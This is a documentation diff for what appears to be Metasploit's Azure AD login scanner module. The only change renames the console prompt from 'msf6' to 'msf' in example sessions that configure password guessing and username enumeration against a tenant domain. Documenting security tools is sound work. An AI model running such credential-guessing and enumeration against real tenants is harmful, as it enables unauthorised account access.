@@ -51,16 +51,16 @@ If a tenant's domain is known, you can use this module for username and password
 Specific target output replaced with *s so as not to disclose information
 
 ```
-msf6 > use auxiliary/scanner/http/azure_ad_login
-msf6 auxiliary(scanner/http/azure_ad_login) > set USER_FILE /home/kali/users.txt
+msf > use auxiliary/scanner/http/azure_ad_login
+msf auxiliary(scanner/http/azure_ad_login) > set USER_FILE /home/kali/users.txt
 USER_FILE => /home/kali/users.txt
-msf6 auxiliary(scanner/http/azure_ad_login) > set PASS_FILE /home/kali/pass.txt
+msf auxiliary(scanner/http/azure_ad_login) > set PASS_FILE /home/kali/pass.txt
 PASS_FILE => /home/kali/pass.txt
-msf6 auxiliary(scanner/http/azure_ad_login) > set DOMAIN example.com
+msf auxiliary(scanner/http/azure_ad_login) > set DOMAIN example.com
 DOMAIN => example.com
-msf6 auxiliary(scanner/http/azure_ad_login) > run
+msf auxiliary(scanner/http/azure_ad_login) > run
 
-msf6 auxiliary(scanner/http/azure_ad_login) > run
+msf auxiliary(scanner/http/azure_ad_login) > run
 
 [-] example.com\wrong is not a valid user
 [-] example.com\wrong is not a valid user
@@ -79,14 +79,14 @@ msf6 auxiliary(scanner/http/azure_ad_login) > run
 If a tenant's domain is known, you can enumerate their usernames
     
 ```
-msf6 > use auxiliary/scanner/http/azure_ad_login
-msf6 auxiliary(scanner/http/azure_ad_login) > set USER_FILE /home/kali/users.txt
+msf > use auxiliary/scanner/http/azure_ad_login
+msf auxiliary(scanner/http/azure_ad_login) > set USER_FILE /home/kali/users.txt
 USER_FILE => /home/kali/users.txt
-msf6 auxiliary(scanner/http/azure_ad_login) > set PASSWORD password
+msf auxiliary(scanner/http/azure_ad_login) > set PASSWORD password
 PASSWORD => password
-msf6 auxiliary(scanner/http/azure_ad_login) > set DOMAIN example.com
+msf auxiliary(scanner/http/azure_ad_login) > set DOMAIN example.com
 DOMAIN => example.com
-msf6 auxiliary(scanner/http/azure_ad_login) > run
+msf auxiliary(scanner/http/azure_ad_login) > run
 
 [-] example.com\wrong is not a valid user
 [-] example.com\k0pak4 is not a valid user
